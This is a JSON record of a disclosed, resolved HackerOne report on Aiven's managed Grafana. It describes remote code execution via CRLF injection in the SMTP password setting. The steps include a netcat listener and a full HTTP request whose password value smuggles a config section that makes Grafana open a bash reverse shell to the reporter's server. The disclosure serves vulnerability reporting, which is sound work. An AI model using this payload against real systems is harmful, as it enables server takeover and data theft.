@@ -1,0 +1,125 @@
+{
+  "id": 1200647,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjAwNjQ3",
+  "url": "https://hackerone.com/reports/1200647",
+  "title": "Grafana RCE via SMTP server parameter injection",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2021-05-18T07:33:54.055Z",
+  "submitted_at": "2021-05-18T07:33:54.133Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jarij",
+    "url": "/jarij",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/6kdmeekofsrtsp1e4v6qpznlxh7k/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 45650,
+    "url": "https://hackerone.com/aiven_ltd",
+    "handle": "aiven_ltd",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4dvu0xq9iacojs2s7fgkd3pbu87f/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4dvu0xq9iacojs2s7fgkd3pbu87f/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Aiven Ltd",
+      "twitter_handle": "",
+      "website": "https://aiven.io",
+      "about": "Fully-managed and hosted database and messaging services on all major clouds in dozens of regions worldwide."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-11-08T06:29:56.557Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-10-25T09:58:44.189Z",
+  "team_member_agreed_on_going_public_at": "2022-11-08T06:29:56.296Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nThis report is similar to [#1180653](https://hackerone.com/reports/1180653), except with different parameter injection entrypoint.\n\nSMTP server password configuration setting accepts new line characters. This can be used to set non-exported configuration variables. Using this CRLF-injection, the `rendering_args` of grafana image renderer can be modified which leads to code execution on the Grafana server.\n\n## Steps To Reproduce:\n\n1.Create Aiven Grafana instance\n2.Setup netcat listener on your server: `nc -n -lvp 4444`\n3.Send the following request to the grafana instance, replace place holders. The aivenv1 token can be retrieved by inspecting the browser traffic.\n4. Browse to https://INSTANCE_SUBDOMAIN.aivencloud.com/render/x to trigger the exploit.\n\n```http\nPUT /v1/project/PROJECT_NAME/service/GRAFANA_INSTANCE_NAME HTTP/1.1\nHost: console.aiven.io\nConnection: keep-alive\nAccept: application/json\nAuthorization: aivenv1 AIVEN_TOKEN_HERE\nX-Aiven-Client-Version: aiven-console/3.5.1-1104.g2809991854\nContent-Type: application/json\nOrigin: https://console.aiven.io\n\n{\n    \"user_config\": {\n        \"smtp_server\": {\n            \"host\": \"example.org\",\n            \"port\": 1,\n            \"from_address\": \"x@examle.org\",\n            \"password\": \"x\\r\\n[plugin.grafana-image-renderer]\\r\\nrendering_args=--renderer-cmd-prefix=bash -c bash$IFS-l$IFS>$IFS/dev/tcp/SERVER_IP/4444$IFS0<&1$IFS2>&1\"\n        }\n    }\n}\n```\n\n## Impact\n\nCommand execution on the grafana server. Access and modify data on the grafana server and possibly the attacker could pivot into other servers on the aiven network.",
+  "bounty_amount": "5000.0",
+  "formatted_bounty": "$5,000",
+  "weakness": {
+    "id": 69,
+    "name": "CRLF Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 72,
+  "voters": [
+    "tkoyeung",
+    "jumpydata",
+    "n1m0",
+    "xploiterr",
+    "haxor31337",
+    "fqdn",
+    "zy9ard3",
+    "mr-k0anti",
+    "rzx007x",
+    "shreyaschavhan",
+    "and 62 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 69451,
+    "asset_type": "OTHER",
+    "asset_identifier": "Aiven for Grafana managed and hosted service",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
